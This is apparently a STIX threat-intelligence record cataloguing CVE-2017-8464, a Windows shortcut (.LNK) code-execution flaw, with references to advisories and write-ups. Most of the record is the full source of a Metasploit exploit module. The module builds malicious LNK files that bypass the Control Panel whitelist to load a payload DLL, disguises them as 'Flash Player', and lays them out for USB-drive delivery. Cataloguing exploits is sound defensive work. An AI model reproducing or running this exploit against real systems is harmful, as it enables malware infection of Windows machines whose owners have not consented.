{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--999e20f6-51c5-4fe6-a34a-e838a531d43b",
    "created": "2024-08-14T16:38:14.19804Z",
    "modified": "2024-08-14T16:38:14.198044Z",
    "name": "LNK Code Execution Vulnerability",
    "description": " This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK) that contain a dynamic icon, loaded from a malicious DLL. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb",
            "external_id": "cve_2017_8464_lnk_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8464"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464"
        },
        {
            "source_name": "reference",
            "url": "http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm"
        },
        {
            "source_name": "reference",
            "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  attr_accessor :exploit_dll_name\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'            => 'LNK Code Execution Vulnerability',\n        'Description'     => %q{\n          This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK)\n          that contain a dynamic icon, loaded from a malicious DLL.\n\n          This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is\n          similar except an additional SpecialFolderDataBlock is included. The folder ID set\n          in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass\n          the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary\n          DLL file.\n\n          If no PATH is specified, the module will use drive letters D through Z so the files\n          may be placed in the root path of a drive such as a shared VM folder or USB drive.\n        },\n        'Author'          =>\n          [\n            'Uncredited',      # vulnerability discovery\n            'Yorick Koster',   # msf module\n            'Spencer McIntyre' # msf module\n          ],\n        'License'         => MSF_LICENSE,\n        'References'      =>\n          [\n            ['CVE', '2017-8464'],\n            ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464'],\n            ['URL', 'http://www.vxjump.net/files/vuln_analysis/cve-2017-8464.txt'], # writeup\n            ['URL', 'https://msdn.microsoft.com/en-us/library/dd871305.aspx'], # [MS-SHLLINK]: Shell Link (.LNK) Binary File Format\n            ['URL', 'http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm'],\n            ['URL', 'https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf']\n          ],\n        'DefaultOptions'  =>\n          {\n            'EXITFUNC'              => 'process',\n            'DisablePayloadHandler' => true\n          },\n        'Arch'            => [ARCH_X86, ARCH_X64],\n        'Payload'         =>\n          {\n            'Space'       => 2048\n          },\n        'Platform'        => 'win',\n        'Targets'         =>\n          [\n            [ 'Automatic',   { 'Arch' => ARCH_ANY } ],\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ],\n            [ 'Windows x86', { 'Arch' => ARCH_X86 } ]\n          ],\n        'DefaultTarget'   => 0, # Default target is Automatic\n        'DisclosureDate'  => '2017-06-13',\n        'Notes'           =>\n          {\n            'Stability'   => [ CRASH_SERVICE_RESTARTS, ],\n          },\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [false, 'The LNK file', 'Flash Player.lnk']),\n        OptString.new('DLLNAME', [false, 'The DLL file containing the payload', 'FlashPlayerCPLApp.cpl']),\n        OptString.new('PATH', [false, 'An explicit path to where the files will be hosted'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('LnkComment', [true, 'The comment to use in the generated LNK file', 'Manage Flash Player Settings']),\n        OptString.new('LnkDisplayName', [true, 'The display name to use in the generated LNK file', 'Flash Player'])\n      ]\n    )\n  end\n\n  def exploit\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-8464')\n    arch = target['Arch'] == ARCH_ANY ? payload.arch.first : target['Arch']\n    datastore['EXE::Path'] = path\n    datastore['EXE::Template'] = ::File.join(path, \"template_#{arch}_windows.dll\")\n\n    dll = generate_payload_dll\n    dll_name = datastore['DLLNAME'] || \"#{rand_text_alpha(16)}.dll\"\n    dll_path = store_file(dll, dll_name)\n    print_status(\"#{dll_path} created, copy it to the root folder of the target USB drive\")\n\n    if datastore['PATH']\n      lnk = generate_link(\"#{datastore['PATH'].chomp(\"\\\\\")}\\\\#{dll_name}\")\n      lnk_filename = datastore['FILENAME'] || \"#{rand_text_alpha(16)}.lnk\"\n      lnk_path = store_file(lnk, lnk_filename)\n      print_status(\"#{lnk_path} created, copy to the target paths\")\n\n    else\n      # HACK: Create LNK files to different drives instead\n      # Copying all the LNK files will likely trigger this vulnerability\n      ('D'..'Z').each do |i|\n        fname, ext = (datastore['FILENAME'] || \"#{rand_text_alpha(16)}.lnk\").split('.')\n        ext = 'lnk' if ext.nil?\n        lnk_filename = \"#{fname}_#{i}.#{ext}\"\n        lnk = generate_link(\"#{i}:\\\\#{dll_name}\")\n        lnk_path = store_file(lnk, lnk_filename)\n        print_status(\"#{lnk_path} created, copy to the target USB drive\")\n      end\n    end\n  end\n\n  def generate_link(path)\n    vprint_status(\"Generating LNK file to load: #{path}\")\n    path << \"\\x00\"\n    display_name = datastore['LnkDisplayName'].dup << \"\\x00\" # LNK Display Name\n    comment = datastore['LnkComment'].dup << \"\\x00\"\n\n    # Control Panel Applet ItemID with our DLL\n    cpl_applet = [\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00\n    ].pack('C*')\n    cpl_applet << [path.length].pack('v')\n    cpl_applet << [display_name.length].pack('v')\n    cpl_applet << path.unpack('C*').pack('v*')\n    cpl_applet << display_name.unpack('C*').pack('v*')\n    cpl_applet << comment.unpack('C*').pack('v*')\n\n    # LinkHeader\n    ret = [\n      0x4c, 0x00, 0x00, 0x00, # HeaderSize, must be 0x0000004C\n      0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, # LinkCLSID, must be 00021401-0000-0000-C000-000000000046\n      0x81, 0x00, 0x00, 0x00, # LinkFlags (HasLinkTargetIDList | IsUnicode)\n      0x00, 0x00, 0x00, 0x00, # FileAttributes\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # CreationTime\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # AccessTime\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # WriteTime\n      0x00, 0x00, 0x00, 0x00, # FileSize\n      0x00, 0x00, 0x00, 0x00, # IconIndex\n      0x00, 0x00, 0x00, 0x00, # ShowCommand\n      0x00, 0x00, # HotKey\n      0x00, 0x00, # Reserved1\n      0x00, 0x00, 0x00, 0x00, # Reserved2\n      0x00, 0x00, 0x00, 0x00  # Reserved3\n    ].pack('C*')\n\n    # IDList\n    idlist_data = ''\n    # ItemID = ItemIDSize (2 bytes) + Data (variable)\n    idlist_data << [0x12 + 2].pack('v')\n    idlist_data << [\n      # All Control Panel Items\n      0x1f, 0x80, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,\n      0x30, 0x9d\n    ].pack('C*')\n    # ItemID = ItemIDSize (2 bytes) + Data (variable)\n    idlist_data << [cpl_applet.length + 2].pack('v')\n    idlist_data << cpl_applet\n    idlist_data << [0x00].pack('v') # TerminalID\n\n    # LinkTargetIDList\n    ret << [idlist_data.length].pack('v') # IDListSize\n    ret << idlist_data\n\n    # ExtraData\n    # SpecialFolderDataBlock\n    ret << [\n      0x10, 0x00, 0x00, 0x00, # BlockSize\n      0x05, 0x00, 0x00, 0xA0, # BlockSignature 0xA0000005\n      0x03, 0x00, 0x00, 0x00, # SpecialFolderID (CSIDL_CONTROLS - My Computer\\Control Panel)\n      0x14, 0x00, 0x00, 0x00  # Offset in LinkTargetIDList\n    ].pack('C*')\n    # TerminalBlock\n    ret << [0x00, 0x00, 0x00, 0x00].pack('V')\n    ret\n  end\n\n  # Store the file in the MSF local directory (eg, /root/.msf4/local/)\n  def store_file(data, filename)\n    @ltype = \"exploit.fileformat.#{@shortname}\"\n\n    if !::File.directory?(Msf::Config.local_directory)\n      FileUtils.mkdir_p(Msf::Config.local_directory)\n    end\n\n    if filename && !filename.empty?\n      fname, ext = filename.split('.')\n    else\n      fname = \"local_#{Time.now.utc.to_i}\"\n    end\n\n    fname = ::File.split(fname).last\n\n    fname.gsub!(/[^a-z0-9\\.\\_\\-]+/i, '')\n    fname << \".#{ext}\"\n\n    path = File.join(\"#{Msf::Config.local_directory}/\", fname)\n    full_path = ::File.expand_path(path)\n    File.open(full_path, \"wb\") { |fd| fd.write(data) }\n\n    full_path.dup\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-06-13",
    "x_mitre_platforms": [
        "win'"
    ]
}